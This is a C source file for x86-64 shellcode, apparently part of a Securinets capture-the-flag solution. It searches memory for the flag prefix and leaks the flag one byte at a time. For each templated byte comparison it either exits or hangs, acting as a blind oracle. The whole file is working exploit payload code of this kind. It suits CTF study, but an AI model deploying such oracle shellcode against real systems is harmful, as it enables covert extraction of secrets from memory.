#include <stddef.h>

static int memcmp(const void *s1, const void *s2, size_t n) {
  for (size_t i = 0; i < n; i++) {
    unsigned char c1 = ((const unsigned char *)s1)[i];
    unsigned char c2 = ((const unsigned char *)s2)[i];
    if (c1 < c2)
      return -1;
    if (c1 > c2)
      return 1;
  }
  return 0;
}

static void *xmemmem(const void *haystack, size_t haystacklen,
                     const void *needle, size_t needlelen) {
  for (size_t i = 0; i < haystacklen - needlelen; i++) {
    const unsigned char *h = (const unsigned char *)haystack + i;
    if (memcmp(h, needle, needlelen) == 0)
      return (void *)h;
  }
  return 0;
}

static long xsyscall(int number, long arg1, long arg2, long arg3, long arg4,
                     long arg5, long arg6) {
  register int rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall\n"
               : "+r"(rax), "+r"(rdx)
               : "r"(rdi), "r"(rsi), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

extern char shellcode_end[];

asm(".pushsection .entry\n"
    "lea shellcode_start(%rip),%rsp\n"
    "jmp entry\n"
    ".popsection");

__attribute__((noreturn)) void entry(void) {
  static const char flag_sig[] = "Securinets{";
  const char *flag =
      xmemmem(shellcode_end, 0x10000, flag_sig, sizeof(flag_sig) - 1);
  if ((flag[IDX] & 0xff) OP VAL)
    xsyscall(60, 0, 0, 0, 0, 0, 0); // __NR_exit
  else
    asm volatile("jmp .");
  __builtin_unreachable();
}